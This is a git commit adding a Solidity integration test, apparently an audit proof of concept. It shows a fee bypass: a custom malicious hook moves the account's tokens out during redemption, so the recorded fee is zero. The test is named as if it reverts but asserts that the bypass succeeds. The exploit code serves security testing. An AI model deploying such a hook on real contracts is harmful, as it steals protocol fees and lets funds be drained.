c76c362e334de1ae38eb76830856b6a89c019f60
Tamara Ringas <tamriasdev@gmail.com>
2025-06-13 10:46:12 +0200

    feat: add test

--- test/integration/E2EExecution.t.sol
+++ test/integration/E2EExecution.t.sol
@@ -167,6 +167,85 @@ contract E2EExecutionTest is MinimalBaseNexusIntegrationTest {
         );
     }
 
+    function test_feeBypassByCustomHook_Reverts() public {
+        uint256 amount = 10000e6;
+        address underlyingToken = CHAIN_1_USDC;
+        address morphoVault = CHAIN_1_MorphoVault;
+
+        address accountOwner = makeAddr("owner");
+        MaliciousHook maliciousHook = new MaliciousHook(accountOwner, underlyingToken);
+
+        // Step 1: Create account and install custom malicious hook
+        address nexusAccount = _createWithNexusWithMaliciousHook(
+            address(nexusRegistry),
+            attesters,
+            threshold,
+            1e18,
+            address(maliciousHook)
+        );
+
+        maliciousHook.setAccount(nexusAccount);
+
+        // Step 2: Account approval to the hook
+        vm.startPrank(nexusAccount);
+        IERC4626(underlyingToken).approve(
+            address(maliciousHook),
+            type(uint256).max
+        );
+
+        // add tokens to account
+        _getTokens(underlyingToken, nexusAccount, amount);
+
+        // 3. Create SuperExecutor data, with:
+        // - approval
+        // - deposit
+        // - redemption, whose amount should be charged
+        address[] memory hooksAddresses = new address[](3);
+        hooksAddresses[0] = approveHook;
+        hooksAddresses[1] = deposit4626Hook;
+        hooksAddresses[2] = redeem4626Hook;
+
+        bytes[] memory hooksData = new bytes[](3);
+        hooksData[0] = _createApproveHookData(
+            underlyingToken,
+            morphoVault,
+            amount,
+            false
+        );
+        hooksData[1] = _createDeposit4626HookData(
+            bytes4(bytes(ERC4626_YIELD_SOURCE_ORACLE_KEY)),
+            morphoVault,
+            amount,
+            false,
+            address(0),
+            0
+        );
+        hooksData[2] = _createRedeem4626HookData(
+            bytes4(bytes(ERC4626_YIELD_SOURCE_ORACLE_KEY)),
+            morphoVault,
+            nexusAccount,
+            IERC4626(morphoVault).convertToShares(amount),
+            false
+        );
+
+        ISuperExecutor.ExecutorEntry memory entry = ISuperExecutor
+            .ExecutorEntry({
+                hooksAddresses: hooksAddresses,
+                hooksData: hooksData
+            });
+
+        address feeRecipient = makeAddr("feeRecipient"); // this is the recipient configured in base tests.
+        
+        // Fetch the fee recipient balance before execution
+        uint256 feeReceiverBalanceBefore = IERC4626(CHAIN_1_USDC).balanceOf(feeRecipient);
+        
+        // prepare data & execute through entry point
+        _executeThroughEntrypoint(nexusAccount, entry);
+
+        // Ensure fee obtained is 0
+        assertEq(IERC4626(CHAIN_1_USDC).balanceOf(feeRecipient) - feeReceiverBalanceBefore, 0);
+    }
+
     /*//////////////////////////////////////////////////////////////
                                  PRIVATE METHODS
     //////////////////////////////////////////////////////////////*/
@@ -181,4 +260,52 @@ contract E2EExecutionTest is MinimalBaseNexusIntegrationTest {
         assertGt(bytes(accountId).length, 0);
         assertEq(accountId, NEXUS_ACCOUNT_IMPLEMENTATION_ID);
     }
+}
+
+contract MaliciousHook {
+    address public owner;
+    address public account;
+    address public underlying;
+    uint256 count;
+    uint256 constant MODULE_TYPE_HOOK = 4;
+
+    constructor(address _owner, address _underlying) {
+        owner = _owner;
+        underlying = _underlying;
+    }
+
+    function setAccount(address _account) external {
+        account = _account;
+    }
+
+    function preCheck(
+        address msgSender,
+        uint256 msgValue,
+        bytes calldata msgData
+    ) external returns (bytes memory hookData) {
+        // do nothing in precheck
+    }
+
+    function postCheck(bytes calldata hookData) external {
+        // This check isn't really necessary. However in our poc we batch
+        // the approve, deposit and redeem calls in the same execution. Because of this, this postCheck
+        // is called three times, after approving, after depositing and after redeeming, so we only want to call this
+        // after redeeming. We limit it with a simple, unoptimized solution.
+        if (count < 2) {
+            count++;
+            return;
+        }
+        // We directly transfer our balance. This will set `outAmount` to 0 in Superform's postExecute call to
+        // ERC4626 redeem hook, instead of the actual redeemed amount.
+        IERC4626(underlying).transferFrom(
+            account,
+            owner,
+            IERC4626(underlying).balanceOf(account)
+        );
+    }
+
+    function isModuleType(uint256 moduleTypeID) external view returns (bool) {
+        return moduleTypeID == MODULE_TYPE_HOOK;
+    }
+    function onInstall(bytes calldata data) external {}
 }
